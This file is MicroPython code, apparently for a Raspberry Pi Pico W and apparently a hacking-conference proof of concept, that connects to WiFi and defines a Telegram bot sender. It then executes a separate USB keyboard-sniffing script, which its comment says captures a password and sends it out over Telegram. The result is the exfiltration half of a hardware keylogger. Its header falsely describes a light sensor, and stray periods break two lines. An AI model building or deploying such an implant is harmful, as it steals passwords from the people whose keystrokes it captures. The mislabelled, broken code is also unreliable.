// POC light Sensor on Attiny85 using a led in reverse mode 
// POC Sensor de luz usando un led en polarizacion inversa
//
// CC Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
// https://creativecommons.org/licenses/by-sa/4.0/
// https://euskalhack.org/ 
//
import network, rp2, time 
from machine import Pin ,freq

Pin(16, mode=Pin.IN, pull=0)#pull=Pin.PULL_DOWN)
Pin(17, mode=Pin.IN, pull=0)#pull=Pin.PULL_UP)
#freq(64000000)#ojo si bajas mucho la freq el wifi no funciona
print("main.py (wifi)") # depuracion
time.sleep(5)

rp2.country('ES')
wlan = network.WLAN(network.STA_IF) # wifi modo cliente/station
wlan.active(True)                   # Enciende Wifi
print("wifi scan")                  # Depuracion
aps = wlan.scan()                   # Obtiene Lista Aps
for ap in aps: print(ap)            # Depuracion Muestra lista aps

#wlan.config(pm = 0xa11140)# Desactiva WiFi power-saving (solo si es necesario)
if   any(b'Red_WiFi1'  in w for w in aps):wlan.connect('Red_WiFi1','password_red1')
elif any(b'Red_Wifi2'  in w for w in aps):wlan.connect('Red_Wifi2','password_red2')
else:
    wlan.active(False).                #si no encuentro ninguna red wifi conocida
    wlan = network.WLAN(network.AP_IF) #Paso a modo punto de acceso
    wlan.config(essid='RP2040w', password='password')
    wlan.active(True)
    
k=0 # Espero un tiempo para conectarse al wifi. si no reinicio
while not wlan.isconnected() and wlan.status() >= 0:
    print('Waiting to connect:' ,wlan.status())
    time.sleep(0.3)
    k+=1
    if k==180:machine.soft_reset()

print(wlan.ifconfig())             # depuracion muestra ip

# Funcion que envia un texto via telegram apibot por GET request
import urequests
def telegram_bot_send_txt(txt):
    print("telegram:",txt)
    tk="Pon-aqui-el-token-de-tu-bot-telegram" #token del bot (ver BotFather)
    cid="Pon_aqui_el_numero_del_chat/user_al_que_enviar_los_mensajes".                               
    txt=txt.replace(' ','+') #reemplazo espacios por + (un urlencode "sencillo)
    url="https://api.telegram.org/"+tk+"/sendMessage?chat_id="+cid+"&text="+txt
    r = urequests.get(url)
    print(r.content[2:10])  #depuracion muestro respuesta de la api
    r.close()

if wlan.status()==3:telegram_bot_send_txt("Rpi PicoW "+wlan.ifconfig()[0]) #depuracion

# ejecuto el codifo que captura la contraseña para enviarla por telegram
try:
    f = open("pio_usb_POC_sniff_kbd.py").read()
    exec(f)
except OSError:  # open failed
   print("error: no encuentro pio_usb_POC_sniff_kbd.py")
